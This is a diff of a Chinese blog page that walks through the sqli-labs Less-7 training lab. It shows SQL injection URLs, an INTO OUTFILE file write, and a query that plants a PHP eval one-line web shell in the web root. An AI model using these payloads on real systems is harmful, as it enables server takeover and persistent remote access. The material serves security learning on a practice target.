@@ -481,7 +481,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    442
+                    459
                 </div>
                 
 
@@ -497,6 +497,9 @@
         </div>
         <hr class="clearfix">
 
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
         
 
         
@@ -516,18 +519,18 @@
 <p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/p/5729087.html">http://www.cnblogs.com/lcamry/p/5729087.html</a></p>
 <p>这里以Less-7为例。</p>
 <h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>根据源代码，对<code>id</code>参数的处理需要<code>&#39;))</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-7/?id=1&#x27;)) or 1=1 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) or 1&#x3D;1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>可以看到回显正常，注入成功。</p>
 <p><img src="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/image-20220203230429238.png" alt="image-20220203230429238"></p>
 <h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>接下来进行文件导入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-7/?id=1&#x27;)) union select 1,2,&#x27;3&#x27; into outfile &#x27;d:/1.txt&#x27; --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,&#39;3&#39; into outfile &#39;d:&#x2F;1.txt&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/image-20220203231905997.png" alt="image-20220203231905997"></p>
 <p><img src="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/image-20220203232014451.png" alt="image-20220203232014451"></p>
 <p>虽然说回显是报错，但打开D盘看到已经将文件进行了导入</p>
 <h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>把一句话木马导入进去：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-7/?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_post[“mima”])?&gt;&#x27; into outfile &#x27;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\yijuhua.php&#x27; --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_post[“mima”])?&gt;&#39; into outfile &#39;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\yijuhua.php&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/image-20220203232725209.png" alt="image-20220203232725209"></p>
 <p><img src="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/image-20220203233022997.png" alt="image-20220203233022997"></p>
@@ -977,7 +980,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">31.4k</span>
+                        class="white-color">32.1k</span>
             
             
             
